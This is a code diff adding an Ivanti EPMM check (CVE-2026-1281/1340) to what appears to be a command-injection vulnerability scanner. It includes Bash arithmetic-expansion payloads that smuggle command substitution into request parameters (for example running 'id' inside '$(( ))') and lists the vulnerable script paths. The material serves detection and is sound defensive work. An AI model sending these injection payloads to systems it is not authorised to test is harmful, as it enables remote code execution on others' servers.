@@ -91,6 +91,24 @@ _PREFIX_WRAPPERS = [
     ("`", "`", "backtick_break"),        # backtick nesting
 ]
 
+# ── CVE-Specific Payloads ────────────────────────────────────────────
+# CVE-2026-1281 / CVE-2026-1340: Ivanti Endpoint Manager Mobile (EPMM)
+# Apache RewriteMap passes user input to Bash scripts without sanitization.
+# Bash shell arithmetic expansion $(( )) allows RCE.
+_IVANTI_EPMM_PATHS = [
+    "/mi/bin/map-appstore-url",
+    "/mi/bin/map-aft-store-url",
+]
+_ARITHMETIC_EXPANSION_PAYLOADS = [
+    # Shell arithmetic expansion — $(( )) evaluated by Bash
+    ("$((7*7))", r"49", "arith_multiply"),
+    ("$((1337+31337))", r"32674", "arith_add"),
+    # Nested command substitution inside arithmetic
+    ("$(($({cmd})))", None, "arith_cmd_sub"),  # pattern set dynamically
+    # Direct command substitution via arithmetic context
+    ("$((1+$(id|wc -c)))", r"\d{2,}", "arith_id_len"),
+]
+
 _RISK2_PREFIXES = [
     ("{orig}%0a", "", "url_newline"),
     ("{orig}\r\n", "", "crlf_inject"),
@@ -519,6 +537,79 @@ class CMDiScanner:
 
         return findings
 
+    # ── CVE-2026-1281/1340: Ivanti EPMM arithmetic expansion ────────
+
+    def test_ivanti_epmm(self) -> List[CMDiFinding]:
+        """Test for CVE-2026-1281/CVE-2026-1340 Ivanti EPMM RCE.
+
+        Apache RewriteMap directives pass user input to Bash scripts
+        (/mi/bin/map-appstore-url, /mi/bin/map-aft-store-url) without
+        sanitization, allowing shell arithmetic expansion $(( )).
+        """
+        findings = []
+        orig = self._orig_params.get(self.param, "test")
+
+        for payload_tmpl, pattern, name in _ARITHMETIC_EXPANSION_PAYLOADS:
+            if pattern is None:
+                continue  # Template payloads handled separately
+
+            payload = f"{orig}{payload_tmpl}"
+            _, body, _ = self._request(payload)
+
+            if re.search(pattern, body) and not re.search(pattern, self._baseline_body):
+                findings.append(CMDiFinding(
+                    technique="cve_2026_1281_ivanti_epmm",
+                    os_type="linux",
+                    param=self.param,
+                    payload=payload,
+                    separator="$((",
+                    evidence=re.search(pattern, body).group(0)[:100],
+                    confidence="confirmed",
+                    details={
+                        "cve": ["CVE-2026-1281", "CVE-2026-1340"],
+                        "product": "Ivanti Endpoint Manager Mobile",
+                        "technique": name,
+                        "description": "Shell arithmetic expansion via Apache RewriteMap",
+                    },
+                ))
+                self._detected_os = "linux"
+                return findings
+
+        # Also test Ivanti-specific paths if URL matches
+        url_path = urllib.parse.urlparse(self.url).path
+        is_ivanti = any(p in url_path for p in _IVANTI_EPMM_PATHS)
+        if is_ivanti:
+            # Try direct command substitution inside arithmetic
+            marker = self._random_marker()
+            arith_payloads = [
+                f"$((1+$(echo {marker}|wc -c)))",
+                f"$(({marker}))",
+            ]
+            for ap in arith_payloads:
+                _, body, _ = self._request(ap)
+                # Check for error messages indicating Bash evaluation
+                for pat in [r"(value too great|operand expected|syntax error|arithmetic)",
+                            r"/bin/(bash|sh).*?error"]:
+                    if re.search(pat, body, re.IGNORECASE) and \
+                       not re.search(pat, self._baseline_body, re.IGNORECASE):
+                        findings.append(CMDiFinding(
+                            technique="cve_2026_1281_ivanti_epmm",
+                            os_type="linux",
+                            param=self.param,
+                            payload=ap,
+                            separator="$((", 
+                            evidence=re.search(pat, body, re.IGNORECASE).group(0)[:100],
+                            confidence="likely",
+                            details={
+                                "cve": ["CVE-2026-1281", "CVE-2026-1340"],
+                                "product": "Ivanti Endpoint Manager Mobile",
+                                "technique": "arith_error_probe",
+                            },
+                        ))
+                        return findings
+
+        return findings
+
     # ── Full scan ──────────────────────────────────────────────────────
 
     def scan(self) -> CMDiResult:
@@ -554,6 +645,11 @@ class CMDiScanner:
             result.techniques_tested.append("file_based")
             file_findings = self.test_file_based()
             result.findings.extend(file_findings)
+
+        # Technique 6: CVE-2026-1281/1340 Ivanti EPMM arithmetic expansion
+        result.techniques_tested.append("cve_ivanti_epmm")
+        ivanti_findings = self.test_ivanti_epmm()
+        result.findings.extend(ivanti_findings)
 
         result.vulnerable = any(f.confidence == "confirmed" for f in result.findings)
         result.os_type = self._detected_os
